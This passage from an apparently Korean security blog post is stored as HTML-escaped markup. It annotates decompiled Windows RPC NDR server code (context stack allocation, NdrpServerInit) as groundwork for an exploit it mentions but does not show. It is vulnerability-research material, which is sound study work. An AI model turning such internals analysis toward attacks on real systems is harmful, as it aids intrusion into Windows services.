&lt;p&gt;&amp;#xC124;&amp;#xBA85;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &amp;#xC544;&amp;#xC2DC;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xAC12;&amp;#xB4E4;&amp;#xC774; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xC5B4;&amp;#xB5A4; &amp;#xAC12;&amp;#xC744; &amp;#xC804;&amp;#xB2EC;&amp;#xD574;&amp;#xC57C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xAC00; &amp;#xC62C;&amp;#xBC14;&amp;#xB974;&amp;#xAC8C; &amp;#xD30C;&amp;#xC2F1;&amp;#xB420; &amp;#xC9C0;&amp;#xB294; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACE0; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt; &amp;#xBC18;&amp;#xD658; &amp;#xD6C4;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;StackSize2 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)NdrProcContext.StackSize;
AllignedStackSize = (NdrProcContext.StackSize + &lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFF0&lt;/span&gt;;
v13 = AllignedStackSize;
BytesRemaining = NdrProcContext.AllocateContext.BytesRemaining;
&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( AllignedStackSize &amp;gt; NdrProcContext.AllocateContext.BytesRemaining )&lt;span class=&#34;hljs-comment&#34;&gt;// (StackSize + f &amp;amp; fffffff0) &amp;gt; 0x200 =&amp;gt; false&lt;/span&gt;
{
  v91 = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( AllignedStackSize + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; )
    v91 = AllignedStackSize + &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;;
  v92 = (_LIST_ENTRY *)I_RpcBCacheAllocate(v91);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v92 )
    RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
  v93 = NdrProcContext.AllocateContext.MemoryList.Flink;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( NdrProcContext.AllocateContext.MemoryList.Flink-&amp;gt;Blink != &amp;amp;NdrProcContext.AllocateContext.MemoryList )
    __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;3u&lt;/span&gt;);
  v92-&amp;gt;Flink = NdrProcContext.AllocateContext.MemoryList.Flink;
  v92-&amp;gt;Blink = &amp;amp;NdrProcContext.AllocateContext.MemoryList;
  v93-&amp;gt;Blink = v92;
  NdrProcContext.AllocateContext.MemoryList.Flink = v92;
  args3 = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)&amp;amp;v92[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
  BytesRemaining = v91 - &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;i64;
  StackSize2 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)NdrProcContext.StackSize;
}
&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
{
  args3 = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)NdrProcContext.AllocateContext.pBlockPointer;
}
args = args3;
v112 = args3;
NdrProcContext.AllocateContext.pBlockPointer = (__int64)&amp;amp;args3[v13];
NdrProcContext.AllocateContext.BytesRemaining = BytesRemaining - v13;
v109 = args3;
memset_0(args3, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, StackSize2);
NdrProcContext.StartofStack = args;
pStubMsg.pContext = &amp;amp;NdrProcContext;
pStubMsg.ContextHandleHash = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; Context&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC778;&amp;#xC790; &amp;#xC804;&amp;#xB2EC;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC2A4;&amp;#xD0DD; &amp;#xACF5;&amp;#xAC04;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;NdrProcContext&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;AllocateContext&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xD544;&amp;#xB4DC;&amp;#xAC00; &amp;#xC788;&amp;#xB294;&amp;#xB370; &lt;code&gt;NdrProcContext&lt;/code&gt;&amp;#xAC00; &amp;#xC2A4;&amp;#xD0DD; &amp;#xBCC0;&amp;#xC218;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774; &amp;#xB610;&amp;#xD55C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC8E0;. &lt;code&gt;AllocateContext.PreAllocatedBlock&lt;/code&gt;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB294; 0x200&amp;#xC778;&amp;#xB370; ProcString&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;StackSize&lt;/code&gt;&amp;#xAC00; &amp;#xC774;&amp;#xBCF4;&amp;#xB2E4; &amp;#xD06C;&amp;#xBA74; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xD560;&amp;#xB2F9;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xADF8;&amp;#xB807;&amp;#xAC8C; &amp;#xB9CE;&amp;#xC740; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC9C4; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC124;&amp;#xBA85;&amp;#xC740; &amp;#xC0DD;&amp;#xB7B5;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;&lt;br&gt;&amp;#xBB34;&amp;#xD2BC;! &lt;code&gt;AllocateContext.pBlockPointer&lt;/code&gt;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &lt;code&gt;arg&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &lt;code&gt;StackSize&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &lt;code&gt;pBlockPointer&lt;/code&gt;&amp;#xB97C; &amp;#xC99D;&amp;#xAC00;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;. ptmalloc2&amp;#xC5D0;&amp;#xC11C; Top Chunk&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C;&amp;#xC640; &amp;#xBE44;&amp;#xC2B7;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xB124;&amp;#xC694; &amp;#x314E;&amp;#x314E; &lt;del&gt;&amp;#xC2DC;&amp;#xAC04;&amp;#xC774; &amp;#xB41C;&amp;#xB2E4;&amp;#xBA74; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4; &amp;#xD799; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xAE00;&amp;#xB3C4; &amp;#xC368;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/del&gt;&lt;br&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; 0&amp;#xC73C;&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xACE0; &lt;code&gt;pStubMsg.pContext&lt;/code&gt;&amp;#xAC00; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;NdrProcContext&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB418;&amp;#xBA70; Context Initialize &amp;#xACFC;&amp;#xC815;&amp;#xC740; &amp;#xB05D;&amp;#xC774; &amp;#xB0A9;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Server-Initialize-NdrpServerInit&#34;&gt;&lt;a href=&#34;#Server-Initialize-NdrpServerInit&#34; class=&#34;headerlink&#34; title=&#34;Server Initialize (NdrpServerInit)&#34;&gt;&lt;/a&gt;Server Initialize (&lt;code&gt;NdrpServerInit&lt;/code&gt;)&lt;/h3&gt;&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;NdrpServerInit&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;NdrpServerInit(&amp;amp;pStubMsg, pRpcMsga, MIDL_STUB_DESC, (__int64)pThis, (__int64)pChannel, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xC640; &lt;code&gt;RpcMsg&lt;/code&gt;, &lt;code&gt;StubDesc&lt;/code&gt;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB124;&amp;#xC694;. &lt;code&gt;pThis&lt;/code&gt;&amp;#xC640; &lt;code&gt;pChannel&lt;/code&gt;&amp;#xC740; &amp;#xBAA8;&amp;#xB450; NULL&amp;#xC774;&amp;#xB2C8; &amp;#xBB34;&amp;#xC2DC;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD569;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *__fastcall &lt;span class=&#34;hljs-title&#34;&gt;NdrpServerInit&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(struct _MIDL_STUB_MESSAGE *StubMsg, PRPC_MESSAGE pRpcMsg, &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; _MIDL_STUB_DESC *pMidlStubDesc, __int64 a4, __int64 a5, __int64 a6)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  NDR_PROC_CONTEXT *Context; &lt;span class=&#34;hljs-comment&#34;&gt;// rbx&lt;/span&gt;
  __int64 v11; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *StartOfStack; &lt;span class=&#34;hljs-comment&#34;&gt;// r14&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *v13; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; v14; &lt;span class=&#34;hljs-comment&#34;&gt;// zf&lt;/span&gt;
  __int64 v15; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *v16; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *v17; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *MyBuffer; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  __int64 BufferLen; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64 v20; &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;THREAD&lt;/span&gt; *&lt;span class=&#34;hljs-title&#34;&gt;v21&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  MALLOC_FREE_STRUCT *v22; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *ProcDesc2; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  __int64 v24; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;hljs-title&#34;&gt;NDROLE_EXTENSION_ROUTINES_TABLE&lt;/span&gt; *&lt;span class=&#34;hljs-title&#34;&gt;v25&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// r13&lt;/span&gt;
  _LIST_ENTRY *v26; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  _LIST_ENTRY *v27; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  _LIST_ENTRY *v28; &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__stdcall *v29)(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *); &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;hljs-title&#34;&gt;MALLOC_FREE_STRUCT&lt;/span&gt; *&lt;span class=&#34;hljs-title&#34;&gt;v30&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  RPC_STATUS v31; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *v32; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  RPC_STATUS v33; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  __int64 v34; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+0h] [rbp-58h] BYREF&lt;/span&gt;

  Context = StubMsg-&amp;gt;pContext;
  v11 = Context-&amp;gt;pSyntaxInfo;
  StartOfStack = Context-&amp;gt;StartofStack;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v11 )
    v13 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 **)(v11 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;);
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    v13 = pMidlStubDesc-&amp;gt;pFormatTypes;
  v14 = Context-&amp;gt;HandleType == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  Context-&amp;gt;DceTypeFormatString = (__int64)v13;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v14 )
  {
    v15 = Context-&amp;gt;pHandleFormatSave;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_BYTE *)v15 == &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; )
    {
      v16 = &amp;amp;StartOfStack[*(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)(v15 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)];
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)(v15 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        v16 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; **)v16;
      *(_QWORD *)v16 = pRpcMsg-&amp;gt;Handle;
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a5 )                                     &lt;span class=&#34;hljs-comment&#34;&gt;// a5 == 0&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    v17 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v17[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;//Flags&lt;/span&gt;
    {
      NdrServerInitializePartial(pRpcMsg, StubMsg, pMidlStubDesc, *v17);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      StubMsg-&amp;gt;_bf_c0 &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFEBD4&lt;/span&gt;;
      StubMsg-&amp;gt;IsClient = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;pAllocAllNodesContext = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pPointerQueueState = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;IgnoreEmbeddedPointers = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;PointerBufferMark = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;StackTop = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;FullPtrXlatTables = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      *(_QWORD *)&amp;amp;StubMsg-&amp;gt;FullPtrRefId = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;UniquePtrCount = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;dwDestContext = &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;
      StubMsg-&amp;gt;pvDestContext = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pRpcChannelBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pArrayInfo = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;RpcMsg = pRpcMsg;
      StubMsg-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
      MyBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
      StubMsg-&amp;gt;BufferStart = MyBuffer;
      BufferLen = pRpcMsg-&amp;gt;BufferLength;
      StubMsg-&amp;gt;_bf_c0 &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFF63F&lt;/span&gt;;
      StubMsg-&amp;gt;BufferEnd = &amp;amp;MyBuffer[BufferLen];
      StubMsg-&amp;gt;uFlags = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;uFlags2 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;pfnAllocate = pMidlStubDesc-&amp;gt;pfnAllocate;
      StubMsg-&amp;gt;pfnFree = pMidlStubDesc-&amp;gt;pfnFree;
      StubMsg-&amp;gt;StubDesc = pMidlStubDesc;
      StubMsg-&amp;gt;LowStackMark = &amp;amp;v34 - &lt;span class=&#34;hljs-number&#34;&gt;1525&lt;/span&gt;;
      StubMsg-&amp;gt;ReuseBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;dwStubPhase = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;CorrDespIncrement = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;pAsyncMsg = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pCorrInfo = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pCorrMemory = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pMemoryList = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      v20 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)NtCurrentTeb()-&amp;gt;ReservedForNtRpc;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v20 )
      {
        v21 = (struct THREAD *)(v20 ^ &lt;span class=&#34;hljs-number&#34;&gt;0xABABABABDEDEDEDE&lt;/span&gt;ui64);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (HANDLE)*((_QWORD *)v21 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != NtCurrentTeb()-&amp;gt;ClientId.UniqueThread )
          __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;0x1E&lt;/span&gt;u);
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      {
        v21 = ThreadSelfHelper();
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v21 )
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
      *((_QWORD *)v21 + &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;) = StubMsg;
      v22 = pMidlStubDesc-&amp;gt;pMallocFreeStruct;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v22 )
      {
        v29 = v22-&amp;gt;pfnFree;
        v30 = pRpcSsDefaults;
        pRpcSsDefaults-&amp;gt;pfnAllocate = v22-&amp;gt;pfnAllocate;
        v30-&amp;gt;pfnFree = v29;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pMidlStubDesc-&amp;gt;Version &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;0xA0000&lt;/span&gt; )
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1829&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (pRpcMsg-&amp;gt;RpcFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )  &lt;span class=&#34;hljs-comment&#34;&gt;// RpcFlags -&amp;gt; 0x1000&lt;/span&gt;
      {
        pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x4000&lt;/span&gt;;
        v31 = I_RpcReceive(pRpcMsg, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v31 )
          RpcRaiseException(v31);
        StubMsg-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
        v32 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
        StubMsg-&amp;gt;BufferStart = v32;
        StubMsg-&amp;gt;BufferEnd = &amp;amp;v32[pRpcMsg-&amp;gt;BufferLength];
      }
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a6 )                                     &lt;span class=&#34;hljs-comment&#34;&gt;// a6 == 0&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;//Flags&lt;/span&gt;
    ((&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__usercall *)(struct _MIDL_STUB_MESSAGE *@&amp;lt;rcx&amp;gt;, struct _NDR_ALLOCA_CONTEXT *@&amp;lt;rdx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *@&amp;lt;r8&amp;gt;, __int64@&amp;lt;r9&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))NdrpPipesInitialize32)(
      StubMsg,
      (struct _NDR_ALLOCA_CONTEXT *)&amp;amp;Context-&amp;gt;AllocateContext,
      (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)Context-&amp;gt;Params,
      (__int64)StartOfStack,
      Context-&amp;gt;NumberParams);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.InterpreterFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    StubMsg-&amp;gt;FullPtrXlatTables = NdrFullPointerXlatInit(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, XLAT_SERVER);
